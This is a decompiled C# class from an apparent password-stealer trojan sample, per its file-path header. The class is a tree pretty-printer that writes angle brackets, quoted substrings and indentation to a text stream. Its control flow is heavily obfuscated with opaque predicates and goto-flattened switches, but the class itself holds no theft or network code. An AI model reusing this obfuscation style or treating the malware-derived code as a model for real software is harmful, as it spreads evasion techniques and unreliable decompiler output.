// Decompiled with JetBrains decompiler
// Type: rw.mp
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System.IO;
using System.Runtime.InteropServices;

namespace rw
{
  public class mp : di
  {
    private string slC;
    private TextWriter llS;
    private int vl6;
    private bool kl0;
    private mp.UwD AlP;
    internal static mp MNI;

    public mp(TextWriter _param1, string _param2, int _param3, mp.UwD _param4, bool _param5)
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.llS = _param1;
      this.vl6 = _param3;
      this.kl0 = _param5;
      this.AlP = _param4;
      int num1 = 0;
      if (false)
        goto label_2;
label_1:
      switch (num1)
      {
        default:
          this.slC = _param2;
          return;
      }
label_2:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public void TlH(XX _param1, int _param2, int _param3)
    {
      int num1 = 3;
label_1:
      int num2 = num1;
      while (true)
      {
        int num3;
        bool flag1;
        XX xx;
        bool flag2;
        bool flag3;
        int num4;
        switch (num2)
        {
          case 1:
            if (flag3)
            {
              _param2 = num3;
              goto label_27;
            }
            else
              goto label_27;
          case 2:
            if (!flag2)
            {
              flag1 = this.Elm(_param1, _param2) > mp.ONL((object) this);
              this.IR0(_param1, flag1, ref _param2, _param3);
              num3 = _param2;
              xx = _param1.Glt;
              num2 = mp.iNf() == null ? 5 : 3;
              continue;
            }
            this.rRL(_param1, ref _param2, false);
            num2 = 7;
            continue;
          case 3:
            flag2 = this.ARW(_param1);
            if (mp.CN8())
            {
              num2 = 2;
              continue;
            }
            goto label_1;
          case 4:
            num4 = mp.mNb((object) this, (object) xx.cly) ? 1 : 0;
            goto label_31;
          case 5:
label_20:
            if (xx == null)
            {
              this.KRE(_param1, flag1, ref _param2, _param3);
              this.llS.Flush();
              if (mp.iNf() == null)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else if (!this.GRG(xx))
            {
              if (this.ARW(xx))
                this.rRL(xx, ref _param2, flag1);
              else
                goto label_29;
label_17:
              flag3 = flag1;
              if (mp.CN8())
              {
                num2 = 1;
                continue;
              }
              goto label_1;
label_29:
              this.TlH(xx, _param2, _param3 + 1);
              goto label_17;
            }
            else
              break;
          case 6:
label_15:
            break;
          case 7:
            goto label_14;
          default:
            goto label_4;
        }
        xx = xx.cly;
        goto label_20;
label_27:
        if (xx.cly != null)
        {
          if (mp.CN8())
          {
            num2 = 4;
            continue;
          }
          goto label_1;
        }
        else
          num4 = 0;
label_31:
        if (num4 == 0)
        {
          if (xx.cly != null)
          {
            this.SRH(xx, flag1, ref _param2, _param3);
            if (mp.iNf() == null)
              num2 = 6;
            else
              goto label_1;
          }
          else
            goto label_15;
        }
        else
        {
          xx = xx.cly;
          goto label_27;
        }
      }
label_4:
      return;
label_14:
      this.llS.Flush();
    }

    private int Elm(XX _param1, int _param2)
    {
      int num1 = this.KRc(_param1);
      XX xx = _param1.Glt;
      int num2;
      while (true)
      {
        bool flag = xx != null;
        int num3 = 2;
        while (true)
        {
          switch (num3)
          {
            case 1:
              num1 += this.wRZ(xx);
              goto label_12;
            case 2:
              if (flag)
              {
                if (!this.GRG(xx))
                {
                  if (mp.eN3((object) this, (object) xx))
                  {
                    num3 = mp.CN8() ? 1 : 0;
                    continue;
                  }
                  num1 += this.Elm(xx, _param2);
                  goto label_12;
                }
                else
                  goto label_7;
              }
              else
                goto label_9;
            case 3:
              num2 = num1 + _param2;
              if (mp.iNf() == null)
              {
                num3 = 0;
                continue;
              }
              break;
            default:
              goto label_16;
          }
label_1:
          int num4;
          num3 = num4;
          continue;
label_12:
          if (num1 + _param2 > this.ERr())
          {
            if (mp.iNf() == null)
              num3 = 3;
            else
              goto label_1;
          }
          else
            break;
        }
label_7:
        xx = xx.cly;
      }
label_9:
      num2 = num1 + this.LR4(xx);
label_16:
      return num2;
    }

    public override int ERr() => this.vl6;

    public override void IR0(XX _param1, bool _param2, ref int _param3, int _param4)
    {
      this.PlI(_param1);
      this.llS.Write("<");
      if (_param2)
      {
        this.llS.WriteLine();
        int num1 = 0;
        if (!mp.CN8())
          goto label_3;
label_1:
        switch (num1)
        {
          default:
            this.llS.Write(new string(' ', _param3 += 2));
            return;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        ++_param3;
    }

    public override void KRE(XX _param1, bool _param2, ref int _param3, int _param4)
    {
      if (_param2)
      {
        mp.eNk((object) this.llS);
        mp.qNo((object) this.llS, (object) new string(' ', _param3 -= 2));
        int num = 0;
        if (mp.iNf() == null)
          goto label_3;
label_1:
        switch (num)
        {
          default:
            goto label_6;
        }
label_3:
        num = 0;
        goto label_1;
      }
label_6:
      this.llS.Write('>');
      if (_param2)
        return;
      ++_param3;
    }

    public override int KRc(XX _param1) => this.qlL(_param1) + 1;

    public override int LR4(XX _param1) => 1;

    public override void rRL(XX _param1, ref int _param2, bool _param3)
    {
      if (this.kl0)
        goto label_6;
label_4:
      int num1 = _param1.TlJ.jl1 - _param1.TlJ.XlX;
      this.llS.Write("'");
      if (num1 > 0)
        goto label_11;
label_3:
      this.llS.Write("'");
      int num2 = 1;
      if (mp.iNf() == null)
        goto label_2;
label_1:
      int num3;
      num2 = num3;
label_2:
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (this.kl0)
            {
              if (mp.CN8())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_9;
          case 2:
            goto label_12;
          default:
            this.llS.Write('>');
            num2 = 2;
            continue;
        }
      }
label_9:
      return;
label_12:
      return;
label_11:
      this.llS.Write(this.slC.Substring(_param1.TlJ.XlX, _param1.TlJ.jl1 - _param1.TlJ.XlX));
      goto label_3;
label_6:
      this.PlI(_param1);
      mp.cNi((object) this.llS, '<');
      goto label_4;
    }

    public override int wRZ(XX _param1)
    {
      int num1 = _param1.TlJ.jl1 - _param1.TlJ.XlX + 2;
      bool kl0 = this.kl0;
      int num2 = 0;
      if (mp.iNf() != null)
        goto label_4;
label_1:
      switch (num2)
      {
        default:
          if (kl0)
            goto label_5;
label_2:
          return num1;
label_5:
          num1 += this.qlL(_param1) + 2;
          goto label_2;
      }
label_4:
      int num3;
      num2 = num3;
      goto label_1;
    }

    public override bool ARW(XX _param1) => _param1.Glt == null;

    public override void SRH(XX _param1, bool _param2, ref int _param3, int _param4)
    {
      if (!_param2)
      {
        this.llS.Write(' ');
        ++_param3;
        int num1 = 0;
        if (mp.iNf() != null)
          goto label_4;
label_1:
        switch (num1)
        {
          default:
            return;
        }
label_4:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
      {
        this.llS.WriteLine();
        this.llS.Write(new string(' ', _param3));
      }
    }

    public override int URl(XX _param1, bool _param2, ref int _param3, int _param4) => 1;

    private int qlL(XX _param1) => mp.LNg((object) this.AlP(_param1));

    private void PlI(XX _param1) => this.llS.Write(this.AlP(_param1));

    internal static bool CN8() => mp.MNI == null;

    internal static mp iNf() => mp.MNI;

    internal static int ONL([In] object obj0) => ((di) obj0).ERr();

    internal static bool mNb([In] object obj0, [In] object obj1) => ((di) obj0).GRG((XX) obj1);

    internal static bool eN3([In] object obj0, [In] object obj1) => ((di) obj0).ARW((XX) obj1);

    internal static void eNk([In] object obj0) => ((TextWriter) obj0).WriteLine();

    internal static void qNo([In] object obj0, [In] object obj1) => ((TextWriter) obj0).Write((string) obj1);

    internal static void cNi([In] object obj0, [In] char obj1) => ((TextWriter) obj0).Write(obj1);

    internal static int LNg([In] object obj0) => ((string) obj0).Length;

    public delegate string UwD(XX node);
  }
}
